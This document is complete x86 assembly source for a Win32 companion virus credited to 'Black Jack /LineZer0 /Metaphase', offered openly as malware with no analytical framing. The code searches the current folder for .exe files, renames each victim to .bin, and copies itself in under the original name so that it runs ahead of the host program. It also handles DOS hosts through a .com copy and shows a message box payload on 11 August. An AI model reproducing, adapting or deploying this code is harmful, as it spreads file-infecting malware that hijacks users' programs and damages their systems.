.386p
.model flat


Extrn FindFirstFileA:Proc
Extrn FindNextFileA:Proc
Extrn FindClose:Proc
Extrn OpenFile:Proc
Extrn ReadFile:Proc
Extrn CloseHandle:Proc
Extrn MoveFileA:Proc
Extrn CopyFileA:Proc
Extrn GetModuleFileNameA:Proc
Extrn GetModuleHandleA:Proc
Extrn GetCommandLineA:Proc
Extrn CreateProcessA:Proc
Extrn ExitProcess:Proc
Extrn GetSystemTime:Proc
Extrn MessageBoxA:Proc


.data

caption                 db "[Eclipse] virus", 0
author                  db "by Black Jack /LineZer0 /Metaphase", 0
message                 db "11. August 1999: a day I will never forget!", 0

filemask                db "*.exe", 0

ProcessInformation      dd 4 dup(0)

StartupInfo:            dd 68
			dd 16 dup(0)

OpenFileData            dd 136 dup(0)



.data?

SystemTime:
year                    dw ?
month                   dw ?
DayOfWeek               dw ?
Day                     dw ?
Hour                    dw ?
Minute                  dw ?
Second                  dw ?
Milliseconds            dw ?

find_data:
FileAttributes          dd ?
CreationTime            dq ?
LastAccessTime          dq ?
LastWriteTime           dq ?
FileSize                dq ?
Reserved                dq ?
FileName                db 260 dup(?)
AlternateFileName       db 14 dup(?)

OurFileName             db 260 dup(?)
OurFileNameBin          db 260 dup(?)
FileName2               db ""                   ; shares space with next var
OurFileNameCom          db 260 dup(?)
CommandLineBuffer       db 260 dup(?)

search_handle           dd ?
ReadBuffer              db 32 dup(?)
ReadBytes               dd ?




.code
org 0
start:
	push offset SystemTime
	call GetSystemTime                      ; get current time
	cmp month, 8                            ; August ?
	JNE no_payload                          ; if not, skip payload
	cmp day, 11                             ; 11th ?
	JNE no_payload                          ; if not, skip payload

						; show messagebox as payload
	push 0                                  ; standart messagebox
	push offset caption                     ; caption of messagebox
	push offset message                     ; actual message
	push 0                                  ; no owner windows
	call MessageBoxA

no_payload:

	push 0                                  ; get our handle of our module
	call GetModuleHandleA

	push 100h                               ; size of buffer
	push offset OurFileName                 ; offse of buffer for name
	push eax                                ; handle of module
	call GetModuleFileNameA                 ; get our file name

	call GetCommandLineA                    ; get our command line

	mov esi, eax                            ; EAX=buffer to command line
	mov edi, offset CommandLineBuffer       ; copy to our own buffer
	call copy_string

	mov esi, offset OurFileName             ; copy our program file name
	mov edi, offset OurFileNameBin          ; to a second buffer
	call copy_string
	
	mov edi, offset OurFileNameBin          ; and change extension in
	mov edx, "NIB."                         ; this buffer to .BIN
	call ChangeExtension

						; open the host file
	push 0                                  ; read access
	push offset OpenFileData                ; some fucking extra info
	push offset OurFileNameBin              ; name of file
	call OpenFile
	push eax                                ; push handle for CloseHandle

						; read victim's DOS exe header
	push 0                                  ; fuck this overlapped shit
	push offset ReadBytes                   ; where to store bytes read
	push 32                                 ; length to read
	push offset ReadBuffer                  ; buffer address
	push eax                                ; Handle
	call ReadFile

	call CloseHandle                        ; filehandle already on stack

	cmp word ptr [offset ReadBuffer+18h], 40h
	JE ExecWinHost                          ; is it a windows exe file?

ExecDosHost:
	mov esi, offset OurFileName             ; copy OurFileName to
	mov edi, offset OurFileNameCom          ; OurFileNameCOM
	call copy_string
	
	mov edi, offset OurFileNameCom          ; change extension in
	mov edx, "moc."                         ; OurFileNameCom to .COM
	call ChangeExtension

	push 0                                  ; overwrite target
	push offset OurFileNameCom              ; copy OurFileNameBin to
	push offset OurFileNameBin              ; OurFileNameCom
	call CopyFileA

	mov edi, offset CommandLineBuffer       ; also change the extension in
	mov edx, "moc."                         ; CommandLineBuffer to .COM
	call ChangeExtension

	call ExecHost                           ; execute the host

	jmp start_find                          ; start to infect!

ExecWinHost:
	mov edi, offset CommandLineBuffer       ; change the extension in
	mov edx, "nib."                         ; CommandLineBuffer to .BIN
	call ChangeExtension

	call ExecHost                           ; execute the host

start_find:
	push offset find_data                   ; address of FindData struc
	push offset filemask                    ; address of filemask
	call FindFirstFileA
	mov search_handle, eax                  ; store search handle
	inc eax                                 ; no file found => return -1
	JZ no_file_found

infect:
	mov esi, offset FileName                ; copy victim's filename
	mov edi, offset FileName2               ; to another buffer
	call copy_string

	mov edi, offset FileName2               ; change victim's filename
	mov edx, "nib."                         ; to "victim.bin"
	call ChangeExtension

	push offset FileName2                   ; rename "victim.exe" to
	push offset FileName                    ; "victim.bin"
	call MoveFileA
	or eax, eax                             ; if error (already infected)
	JZ find_next                            ; the function returns zero

						; copy us as victim.exe
	push 1                                  ; don't overwrite target
	push offset FileName                    ; our victim
	push offset OurFileName                 ; the virus file
	call CopyFileA

find_next:
	push offset find_data                   ; offset of find data struc
	push search_handle                      ; our search handle
	call FindNextFileA                      ; find next file
	dec eax                                 ; EAX=1 if file found
	JZ infect                               ; if file found, infect it

no_file_found:                                  ; otherwise quit virus
	push search_handle                      ; close the filefinding
	call FindClose

	push 0                                  ; return code
	call ExitProcess                        ; quit program

; ----- END MAIN PROGRAM ----------------------------------------------------

; Proc ChangeExtension: changes extension in filename
; Parameters:
; EDI=Pointer to filename
; EDX=new filename extension

ChangeExtension:
	dec edi                                 ; will be inc'ed again soon
	mov al, '.'                             ; search for dot
	mov ecx, 260                            ; length of filename
	cld                                     ; search upwards
go_on:
	inc edi                                 ; search on after last dot
	repne scasb                             ; search the dot
	dec edi                                 ; set it back to the dot
	mov ebx, [edi]                          ; get extension to EBX
	or ebx, 20202000h                       ; convert to lower case
	cmp ebx, "exe."                         ; is it the extension
	JNE go_on                               ; if not, go on searching

	mov dword ptr [edi], edx                ; if it is, change it

	ret                                     ; return to caller

; ---------------------------------------------------------------------------

; Proc ExecHost: executes the host file specified in CommandLineBuffer

ExecHost:
	push offset ProcessInformation          ; pointer to return stuff
	push offset StartupInfo                 ; pointer to further info
	push 0                                  ; same current dir as we
	push 0                                  ; same enviroment block as we
	push 0                                  ; creation flags
	push 0                                  ; don't inherit handles
	push 0                                  ; thread security attributes
	push 0                                  ; process security attributes
	push offset CommandLineBuffer           ; command line (+filename)
	push 0                                  ; filename
	call CreateProcessA                     ; run the host (finally!)

	ret                                     ; return to caller

; ---------------------------------------------------------------------------

; Proc copy_string: copies filename from ESI to EDI

copy_string:
	mov ecx, 260                            ; standart filename length
	cld                                     ; copy upwards
	rep movsb                               ; copy it!
	
	ret                                     ; return to caller


end start
